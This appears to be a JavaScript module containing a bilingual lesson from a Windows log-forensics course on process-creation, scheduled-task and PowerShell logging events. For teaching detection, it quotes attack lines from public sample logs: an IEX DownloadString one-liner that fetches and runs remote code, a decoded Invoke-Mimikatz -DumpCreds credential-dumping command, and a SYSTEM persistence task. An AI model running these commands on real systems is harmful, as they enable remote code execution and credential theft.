/**
 * 4.6 — Tiến trình, tác vụ hẹn giờ, PowerShell (soạn 24/11/2026, agent lgz). Output thật: OUT['s04/tien-trinh'].
 * Số tất định: 4688 cmd.exe IE10WIN7$ "resume-vm-default.bat"; CommandLine: dbc 8346/7671/199 rỗng, big_sample 382/0, dirty 154/154/154 rỗng; cha–con dirty: csrss<-smss 28, smss<-smss 28, autochk 14, lsass<-wininit 14…;
 * \eviltask 2021-04-21T13:30:00 admmig → C:\tools\shell.cmd, PT1M, S-1-5-18; 4624 a-jbrown type 3 172.16.66.142 logonId 0x21a8c68 = SubjectLogonId 4702 \LMST (cmd.exe /c echo testing > c:\users\public\out.txt, SYSTEM, HighestAvailable);
 * ps-tai-payload 20:11:11 4104 Verbose IEX(New-Object Net.WebClient).downloadString(miro.medium.com …png); ps-obfuscation 64 Verbose / 2 Warning; giải mã → Invoke-Mimikatz -DumpCreds (PowerSploit).
 */
import { lenh, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '4.6 — Processes, scheduled tasks and PowerShell: 4688, 4698/4702, 4103/4104|||4.6 — Tiến trình, tác vụ hẹn giờ và PowerShell: 4688, 4698/4702, 4103/4104',
  slug: 'log-4-6-tien-trinh-tac-vu',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Cái gì đã CHẠY trên máy: 4688 tạo tiến trình (dòng lệnh chỉ có khi bật chính sách — ba máy mẫu ba trạng thái), quan hệ cha–con, TokenElevationType; 4698/4702 tạo/sửa tác vụ hẹn giờ và đọc XML bên trong; PowerShell 4103/4104 ghi cả script đã giải mã. Mẫu thật: tác vụ chạy shell.cmd mỗi phút dưới SYSTEM, tác vụ bị sửa từ xa cùng Logon ID, IEX DownloadString, và giải mã một lệnh Invoke-Obfuscation ra Invoke-Mimikatz.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.6</span>
<h2>What actually ran on this machine</h2>
<p class="lead">Logons tell you who came in; services tell you what was installed. The question that closes most investigations is more direct: <em>which programs ran, with which arguments, started by what?</em> Windows answers with three families of events — process creation (4688), scheduled tasks (4698/4702) and PowerShell (4103/4104) — <strong>if</strong> they are switched on. This lesson shows what each looks like, what is missing when they are off, and how attackers try to hide inside them.</p>

<h3>The everyday picture: the kitchen order tickets</h3>
<p>A restaurant prints a ticket for every dish: what (process name), exactly how (command line — "no onions, extra chili"), which waiter ordered it (parent process), for which table (user/session). A ticket without the "how" line is much less useful. Scheduled tasks are the standing orders ("every day at 7:00, two coffees to table 5"); PowerShell script logging is a camera on the cook's recipe book.</p>

${kv([
  ['4688 / 4689', 'A new process was created / exited (Security, "Audit Process Creation").'],
  ['CommandLine', 'Arguments — only if the policy "Include command line in process creation events" is on.'],
  ['ParentProcessName', 'Who started it (Windows 10 / Server 2016 and later).'],
  ['TokenElevationType', '%%1936 full token (UAC off, built-in admin, service), %%1937 elevated, %%1938 limited.'],
  ['4698 / 4702 / 4699', 'Scheduled task created / updated / deleted (full task XML inside).'],
  ['4104', 'PowerShell Script Block Logging: the text of the code PowerShell compiled — after deobfuscation.'],
  ['4103', 'PowerShell Module Logging: each command invoked and its parameters.'],
])}

<h3>Step 1 — a 4688, and the field that is usually empty</h3>
${lenh('s04/tien-trinh', 0)}
${lenh('s04/tien-trinh', 1)}
<p>Three real machines, three situations: the Windows 7 sample has the <code>CommandLine</code> field and it is filled (here VMware Tools running a resume script); the older <code>security_big_sample</code> has <strong>no such field</strong> (the event version predates it); the Windows 10 sample has the field on every event but it is <strong>always empty</strong> — the policy was never turned on. Microsoft says it plainly: "By default Process Command Line field is empty." Without it, you know <code>powershell.exe</code> ran, not what it did. Lesson 5.5 shows the two settings (Audit Process Creation + Include command line).</p>

<h3>Step 2 — parent and child</h3>
${lenh('s04/tien-trinh', 2)}
<p>Boot of a healthy Windows 10: smss → csrss, wininit → lsass and services. Every machine has its own normal family tree; investigators look for odd branches: <code>winword.exe → powershell.exe</code> (a document launching a script), <code>w3wp.exe → cmd.exe</code> (a web server spawning a shell — a webshell), <code>services.exe → cmd.exe</code> (a service that is really a command, like Lesson 4.5's pipe trick). Sysmon event 1 (Lesson 5.6) adds hashes and the full parent command line.</p>

<h3>Step 3 — scheduled tasks: read the XML</h3>
${lenh('s04/tien-trinh', 3)}
<p>4698 contains the whole task definition as XML in <code>TaskContent</code>; parse it instead of reading the sentence. Here <code>\\eviltask</code> (EVTX-to-MITRE-Attack sample) runs <code>C:\\tools\\shell.cmd</code> <strong>every minute</strong> (<code>PT1M</code>) as <strong>S-1-5-18 = SYSTEM</strong>, created by admmig: persistence that comes back even if you kill the process. Things to check in any new task: the command (folder, script, encoded PowerShell), the account (SYSTEM?), the trigger (every minute, at logon, at boot), and the author.</p>

<h3>Step 4 — a task changed over the network</h3>
${lenh('s04/tien-trinh', 4)}
${lenh('s04/tien-trinh', 5)}
<p>EVTX-ATTACK-SAMPLES: three network logons (type 3) of <code>a-jbrown</code> from 172.16.66.142, and 117 ms later a 4702 "task updated" whose <code>SubjectLogonId</code> is <strong>0x21a8c68 — the same as the first logon</strong>. The existing task <code>\\LMST</code> now runs <code>cmd.exe</code> as SYSTEM with the highest privileges. Logon ID links "who came from where" (4624) with "what they changed" (4702): remote task abuse for lateral movement, without creating a new task that a 4698 rule would catch.</p>

<h3>Step 5 — PowerShell 4104: the code, in clear</h3>
${lenh('s04/tien-trinh', 6)}
<p>A classic one-liner: <code>IEX(New-Object Net.WebClient).downloadString('https://…png')</code> — download text from a URL (disguised as an image) and <strong>execute it in memory</strong>, no file on disk. 4104 has the exact text; 4103 shows the same command passing through <code>Out-Default</code>. Note the level: <strong>Verbose</strong>. PowerShell automatically logs blocks it finds suspicious at <em>Warning</em> level even without configuration, but this one was not flagged — you only have it because full script block logging was on.</p>
${lenh('s04/tien-trinh', 7)}
${lenh('s04/tien-trinh', 8)}
<p>DeepBlueCLI's Invoke-Obfuscation sample: a command built from <code>$env:ComSpec[4,15,25]</code> (letters picked from "C:\\Windows\\system32\\cmd.exe" to spell "iex") and a list of character codes. The same decoding PowerShell does internally, done here with a regex: it downloads <strong>Invoke-Mimikatz</strong> from the PowerSploit project and dumps credentials. Only 2 of 66 blocks reached Warning level. The lesson: obfuscation fools humans and simple string rules; script block logging records what was executed, and a decoder (or PowerShell itself) reveals it.</p>

<h3>On your own Windows PC</h3>
<pre><code class="language-powershell"># Is process-creation auditing with command line on? (run as administrator)
auditpol /get /subcategory:"Process Creation"
Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit' -ErrorAction SilentlyContinue |
  Select-Object ProcessCreationIncludeCmdLine_Enabled
# Scheduled tasks created or changed recently, with the command they run
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4698,4702 } -MaxEvents 20 -ErrorAction SilentlyContinue |
  ForEach-Object { $x = [xml]$_.ToXml(); $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    $t = [xml]($d.TaskContent + $d.TaskContentNew); [pscustomobject]@{ Time = $_.TimeCreated; Task = $d.TaskName; Run = $t.Task.Actions.Exec.Command } }
# PowerShell script blocks logged as Warning (suspicious) in the last day
Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104; Level = 3; StartTime = (Get-Date).AddDays(-1) } -ErrorAction SilentlyContinue</code></pre>

<h3>🛡️ Attacker's corner: living off the land</h3>
<p>Modern intrusions use what Windows already has: PowerShell (ATT&amp;CK T1059.001), scheduled tasks (T1053.005), <code>cmd</code>, <code>wmic</code>, <code>rundll32</code>. No malware file to scan — only processes and command lines. Obfuscation (T1027) hides intent from a human reading the log, not from script block logging. That is why the three settings of this lesson — process creation with command line, the Security task events, PowerShell script block logging — are on every hardening checklist, and why attackers try to downgrade to PowerShell 2 (which has no script block logging) or turn the logs off (Lesson 4.3).</p>

<h3>🎤 What an interviewer will ask</h3>
<ul>
<li>"4688 shows powershell.exe but no arguments. Why?" — the "Include command line" policy is off (default).</li>
<li>"How do you find persistence through scheduled tasks?" — 4698/4702 (Security) or TaskScheduler/Operational; parse the XML: command, account, trigger.</li>
<li>"What is the difference between 4103 and 4104?" — module logging (commands + parameters) vs script block logging (the code text, deobfuscated).</li>
<li>"Name suspicious parent–child pairs." — Office → PowerShell/cmd, w3wp/httpd → cmd, services → cmd, explorer → rundll32 with a temp DLL.</li>
</ul>

<h3>At work</h3>
<p>Developers also benefit: a deployment script that "sometimes fails" on a Windows build agent is easy to debug when 4104 shows the exact script version that ran and 4688 shows the command lines it spawned. On customer servers, check with the security team before enabling script block logging: it can capture secrets that scripts pass as plain text (connection strings, tokens) — the same reason Chapter 16 asks you never to put secrets on command lines.</p>

<h3>🧪 Practice (25 min)</h3>
<div class="callout ok"><ol>
<li>In <code>task-4698.evtx</code>, how many times per hour will the task run, and as which account?</li>
<li>In <code>task-4624-4702.evtx</code>, which field links the 4702 to the network logon, and what is its value?</li>
<li>Decode the second script block of <code>ps-obfuscation.evtx</code> (hex values) the same way. What does it do?</li>
</ol>
<p><strong>Pass:</strong> (1) 60 times (PT1M), SYSTEM (S-1-5-18); (2) SubjectLogonId of 4702 = TargetLogonId of the first 4624: 0x21a8c68; (3) the hex codes decode to the same <code>IEX (New-Object Net.WebClient).DownloadString(…Invoke-Mimikatz.ps1); Invoke-Mimikatz -DumpCreds</code> — another encoding of the same payload.</p></div>

<h3>🗂 Key terms</h3>
${kv([
  ['4688', 'Process created: name, command line (if enabled), parent, token type, session.'],
  ['LOLBins', 'Built-in Windows programs abused by attackers ("living off the land").'],
  ['4698 / 4702', 'Scheduled task created / updated; TaskContent = full XML.'],
  ['4104 / 4103', 'PowerShell script block / module logging.'],
  ['IEX … DownloadString', 'Download and run code in memory — a classic red flag.'],
  ['Obfuscation', 'Hiding code from readers; script block logging records the decoded form.'],
])}

<h3>📌 Summary</h3>
<ul>
<li>4688 without command line is half a story — turn the policy on.</li>
<li>Read parent–child pairs against the machine's normal tree.</li>
<li>Parse task XML: command, account, trigger; link 4702/4698 to logons via Logon ID.</li>
<li>4104 shows the real code even when it was obfuscated; do not rely on Warning level alone.</li>
</ul>
${nguon('📘', 'Microsoft Learn — 4688(S): A new process has been created', 'Fields, TokenElevationType, "Include command line"', 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688')}
${nguon('📘', 'Microsoft Learn — 4698(S): A scheduled task was created', 'TaskContent XML', 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4698')}
${nguon('📘', 'Microsoft Learn — about_Logging_Windows', 'Script block logging, automatic Warning-level logging', 'https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows')}
${nguon('🛡️', 'MITRE ATT&CK T1059.001 — PowerShell', 'and T1053.005 Scheduled Task, T1027 Obfuscated Files or Information', 'https://attack.mitre.org/techniques/T1059/001/')}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-5-5-audit-policy', title: 'Lesson 5.5 — Audit policy', sub: 'Turn on process creation with command line', cta: 'Open' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-5-6-sysmon', title: 'Lesson 5.6 — Sysmon', sub: 'Event 1 with hashes and parent command line', cta: 'Open' })}
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.6</span>
<h2>Thứ gì đã thật sự chạy trên máy này</h2>
<p class="lead">Đăng nhập cho biết ai đã vào; dịch vụ cho biết cái gì đã được cài. Câu hỏi khép lại phần lớn các cuộc điều tra thì trực diện hơn: <em>chương trình nào đã chạy, với tham số gì, do cái gì khởi động?</em> Windows trả lời bằng ba họ sự kiện — tạo tiến trình (4688), tác vụ hẹn giờ (4698/4702) và PowerShell (4103/4104) — <strong>nếu</strong> chúng được bật. Bài này cho thấy từng loại trông thế nào, thiếu gì khi chúng tắt, và kẻ tấn công cố trốn bên trong chúng ra sao.</p>

<h3>Liên tưởng đời thường: phiếu gọi món trong bếp</h3>
<p>Nhà hàng in một phiếu cho mỗi món: món gì (tên tiến trình), làm chính xác thế nào (dòng lệnh — "không hành, thêm ớt"), bồi bàn nào gọi (tiến trình cha), cho bàn nào (người dùng/phiên). Một phiếu thiếu dòng "làm thế nào" thì kém giá trị hơn nhiều. Tác vụ hẹn giờ là các đơn đặt cố định ("ngày nào 7:00 cũng hai cà phê cho bàn 5"); ghi log script PowerShell là camera chĩa vào cuốn công thức của đầu bếp.</p>

${kv([
  ['4688 / 4689', 'Tạo / kết thúc tiến trình (Security, "Audit Process Creation").'],
  ['CommandLine', 'Tham số — chỉ có khi bật chính sách "Include command line in process creation events".'],
  ['ParentProcessName', 'Ai khởi động nó (Windows 10 / Server 2016 trở đi).'],
  ['TokenElevationType', '%%1936 token đầy đủ (tắt UAC, admin có sẵn, dịch vụ), %%1937 đã nâng quyền, %%1938 bị giới hạn.'],
  ['4698 / 4702 / 4699', 'Tác vụ hẹn giờ được tạo / sửa / xoá (có nguyên XML của tác vụ).'],
  ['4104', 'PowerShell Script Block Logging: chữ của đoạn mã PowerShell đã biên dịch — sau khi giải rối.'],
  ['4103', 'PowerShell Module Logging: từng lệnh được gọi kèm tham số.'],
])}

<h3>Bước 1 — một 4688, và cái trường thường bị trống</h3>
${lenh('s04/tien-trinh', 0)}
${lenh('s04/tien-trinh', 1)}
<p>Ba máy thật, ba tình huống: mẫu Windows 7 có trường <code>CommandLine</code> và có nội dung (ở đây VMware Tools chạy một script khi máy ảo chạy tiếp); mẫu cũ hơn <code>security_big_sample</code> <strong>không có trường đó</strong> (phiên bản sự kiện có trước khi trường ra đời); mẫu Windows 10 có trường ở mọi sự kiện nhưng <strong>luôn rỗng</strong> — chính sách chưa bao giờ được bật. Microsoft nói thẳng: "By default Process Command Line field is empty." Thiếu nó, bạn biết <code>powershell.exe</code> đã chạy, nhưng không biết nó làm gì. Bài 5.5 chỉ hai thiết lập cần bật (Audit Process Creation + Include command line).</p>

<h3>Bước 2 — cha và con</h3>
${lenh('s04/tien-trinh', 2)}
<p>Lúc khởi động của một Windows 10 khoẻ mạnh: smss → csrss, wininit → lsass và services. Mỗi máy có cây gia phả bình thường của riêng nó; người điều tra tìm các nhánh lạ: <code>winword.exe → powershell.exe</code> (một tài liệu khởi động script), <code>w3wp.exe → cmd.exe</code> (máy chủ web sinh ra shell — một webshell), <code>services.exe → cmd.exe</code> (một dịch vụ thật ra là câu lệnh, như mánh pipe ở Bài 4.5). Sysmon sự kiện 1 (Bài 5.6) có thêm mã băm và dòng lệnh đầy đủ của tiến trình cha.</p>

<h3>Bước 3 — tác vụ hẹn giờ: đọc XML</h3>
${lenh('s04/tien-trinh', 3)}
<p>4698 chứa nguyên định nghĩa tác vụ dạng XML trong <code>TaskContent</code>; hãy phân tích XML thay vì đọc câu chữ. Ở đây <code>\\eviltask</code> (mẫu EVTX-to-MITRE-Attack) chạy <code>C:\\tools\\shell.cmd</code> <strong>mỗi phút</strong> (<code>PT1M</code>) dưới <strong>S-1-5-18 = SYSTEM</strong>, do admmig tạo: bám trụ kiểu giết tiến trình rồi nó vẫn quay lại. Những thứ cần xem ở mọi tác vụ mới: lệnh (thư mục, script, PowerShell mã hoá), tài khoản (SYSTEM?), điều kiện kích hoạt (mỗi phút, khi đăng nhập, khi khởi động), và tác giả.</p>

<h3>Bước 4 — một tác vụ bị sửa qua mạng</h3>
${lenh('s04/tien-trinh', 4)}
${lenh('s04/tien-trinh', 5)}
<p>EVTX-ATTACK-SAMPLES: ba lần đăng nhập mạng (type 3) của <code>a-jbrown</code> từ 172.16.66.142, và 117 ms sau là một 4702 "tác vụ bị sửa" có <code>SubjectLogonId</code> là <strong>0x21a8c68 — trùng với lần đăng nhập đầu tiên</strong>. Tác vụ có sẵn <code>\\LMST</code> giờ chạy <code>cmd.exe</code> dưới SYSTEM với quyền cao nhất. Logon ID nối "ai đến từ đâu" (4624) với "họ đã sửa gì" (4702): lạm dụng tác vụ từ xa để di chuyển ngang, mà không tạo tác vụ mới để luật bắt 4698 tóm được.</p>

<h3>Bước 5 — PowerShell 4104: mã nguồn, rõ ràng</h3>
${lenh('s04/tien-trinh', 6)}
<p>Một câu lệnh kinh điển: <code>IEX(New-Object Net.WebClient).downloadString('https://…png')</code> — tải chữ từ một URL (giả làm ảnh) và <strong>chạy nó ngay trong bộ nhớ</strong>, không có tệp nào trên đĩa. 4104 có nguyên văn; 4103 cho thấy cùng câu lệnh đi qua <code>Out-Default</code>. Để ý mức: <strong>Verbose</strong>. PowerShell tự động ghi các khối nó thấy đáng ngờ ở mức <em>Warning</em> kể cả khi chưa cấu hình gì, nhưng khối này không bị gắn cờ — bạn có nó chỉ vì ghi script block đầy đủ đã được bật.</p>
${lenh('s04/tien-trinh', 7)}
${lenh('s04/tien-trinh', 8)}
<p>Mẫu Invoke-Obfuscation của DeepBlueCLI: một câu lệnh dựng từ <code>$env:ComSpec[4,15,25]</code> (nhặt chữ từ "C:\\Windows\\system32\\cmd.exe" để ghép thành "iex") và một danh sách mã ký tự. Cùng phép giải mã mà PowerShell làm bên trong, ở đây làm bằng regex: nó tải <strong>Invoke-Mimikatz</strong> từ dự án PowerSploit rồi trích mật khẩu. Chỉ 2 trong 66 khối lên mức Warning. Bài học: làm rối mã đánh lừa được con người và các luật so chuỗi đơn giản; script block logging ghi lại thứ đã được thực thi, và một bộ giải mã (hoặc chính PowerShell) lật nó ra.</p>

<h3>Trên máy Windows của bạn</h3>
<pre><code class="language-powershell"># Kiểm toán tạo tiến trình kèm dòng lệnh đã bật chưa? (chạy bằng quyền quản trị)
auditpol /get /subcategory:"Process Creation"
Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit' -ErrorAction SilentlyContinue |
  Select-Object ProcessCreationIncludeCmdLine_Enabled
# Tác vụ hẹn giờ mới tạo hoặc bị sửa gần đây, kèm lệnh chúng chạy
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4698,4702 } -MaxEvents 20 -ErrorAction SilentlyContinue |
  ForEach-Object { $x = [xml]$_.ToXml(); $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    $t = [xml]($d.TaskContent + $d.TaskContentNew); [pscustomobject]@{ Luc = $_.TimeCreated; TacVu = $d.TaskName; Chay = $t.Task.Actions.Exec.Command } }
# Các khối script PowerShell bị ghi mức Warning (đáng ngờ) trong một ngày qua
Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104; Level = 3; StartTime = (Get-Date).AddDays(-1) } -ErrorAction SilentlyContinue</code></pre>

<h3>🛡️ Góc hacker: sống nhờ đồ có sẵn</h3>
<p>Các vụ xâm nhập hiện đại dùng những gì Windows đã có: PowerShell (ATT&amp;CK T1059.001), tác vụ hẹn giờ (T1053.005), <code>cmd</code>, <code>wmic</code>, <code>rundll32</code>. Không có tệp mã độc nào để quét — chỉ có tiến trình và dòng lệnh. Làm rối mã (T1027) giấu ý đồ khỏi người đọc log, không giấu được khỏi script block logging. Vì thế ba thiết lập của bài này — tạo tiến trình kèm dòng lệnh, sự kiện tác vụ trong Security, PowerShell script block logging — có mặt trong mọi danh sách gia cố, và vì thế kẻ tấn công tìm cách hạ xuống PowerShell 2 (không có script block logging) hoặc tắt log đi (Bài 4.3).</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ul>
<li>"4688 hiện powershell.exe nhưng không có tham số. Vì sao?" — chính sách "Include command line" đang tắt (mặc định).</li>
<li>"Tìm bám trụ qua tác vụ hẹn giờ thế nào?" — 4698/4702 (Security) hoặc TaskScheduler/Operational; phân tích XML: lệnh, tài khoản, điều kiện kích hoạt.</li>
<li>"4103 khác 4104 thế nào?" — module logging (lệnh + tham số) so với script block logging (chữ của mã, đã giải rối).</li>
<li>"Kể vài cặp cha–con đáng ngờ." — Office → PowerShell/cmd, w3wp/httpd → cmd, services → cmd, explorer → rundll32 với DLL trong thư mục tạm.</li>
</ul>

<h3>Đi làm thật</h3>
<p>Lập trình viên cũng được lợi: một script triển khai "lúc được lúc không" trên máy build Windows sẽ dễ gỡ lỗi khi 4104 cho thấy đúng phiên bản script đã chạy và 4688 cho thấy các dòng lệnh nó sinh ra. Trên máy chủ của khách, hỏi đội bảo mật trước khi bật script block logging: nó có thể bắt cả bí mật mà script truyền dạng chữ rõ (chuỗi kết nối, token) — cùng lý do Chương 16 dặn đừng bao giờ đặt bí mật trên dòng lệnh.</p>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok"><ol>
<li>Trong <code>task-4698.evtx</code>, tác vụ sẽ chạy bao nhiêu lần mỗi giờ, dưới tài khoản nào?</li>
<li>Trong <code>task-4624-4702.evtx</code>, trường nào nối 4702 với lần đăng nhập mạng, giá trị là gì?</li>
<li>Giải mã khối script thứ hai của <code>ps-obfuscation.evtx</code> (các giá trị hex) theo cùng cách. Nó làm gì?</li>
</ol>
<p><strong>Đạt khi:</strong> (1) 60 lần (PT1M), SYSTEM (S-1-5-18); (2) SubjectLogonId của 4702 = TargetLogonId của 4624 đầu tiên: 0x21a8c68; (3) các mã hex giải ra cùng câu <code>IEX (New-Object Net.WebClient).DownloadString(…Invoke-Mimikatz.ps1); Invoke-Mimikatz -DumpCreds</code> — một kiểu mã hoá khác của cùng tải trọng.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
${kv([
  ['4688', 'Tạo tiến trình: tên, dòng lệnh (nếu bật), cha, loại token, phiên.'],
  ['LOLBins', 'Chương trình có sẵn của Windows bị kẻ tấn công lạm dụng ("sống nhờ đồ có sẵn").'],
  ['4698 / 4702', 'Tạo / sửa tác vụ hẹn giờ; TaskContent = nguyên XML.'],
  ['4104 / 4103', 'PowerShell script block / module logging.'],
  ['IEX … DownloadString', 'Tải và chạy mã trong bộ nhớ — dấu đỏ kinh điển.'],
  ['Làm rối mã', 'Giấu mã khỏi người đọc; script block logging ghi lại dạng đã giải.'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>4688 thiếu dòng lệnh là nửa câu chuyện — hãy bật chính sách.</li>
<li>Đọc cặp cha–con so với cây bình thường của máy.</li>
<li>Phân tích XML của tác vụ: lệnh, tài khoản, điều kiện; nối 4702/4698 với đăng nhập bằng Logon ID.</li>
<li>4104 cho thấy mã thật kể cả khi đã bị làm rối; đừng chỉ dựa vào mức Warning.</li>
</ul>
${nguon('📘', 'Microsoft Learn — 4688(S): A new process has been created', 'Các trường, TokenElevationType, "Include command line"', 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688')}
${nguon('📘', 'Microsoft Learn — 4698(S): A scheduled task was created', 'XML trong TaskContent', 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4698')}
${nguon('📘', 'Microsoft Learn — about_Logging_Windows', 'Script block logging, tự ghi mức Warning', 'https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows')}
${nguon('🛡️', 'MITRE ATT&CK T1059.001 — PowerShell', 'và T1053.005 Scheduled Task, T1027 Obfuscated Files or Information', 'https://attack.mitre.org/techniques/T1059/001/')}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-5-5-audit-policy', title: 'Bài 5.5 — Audit policy', sub: 'Bật tạo tiến trình kèm dòng lệnh', cta: 'Mở bài' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-5-6-sysmon', title: 'Bài 5.6 — Sysmon', sub: 'Sự kiện 1 có mã băm và dòng lệnh của tiến trình cha', cta: 'Mở bài' })}
</div>
`,
};
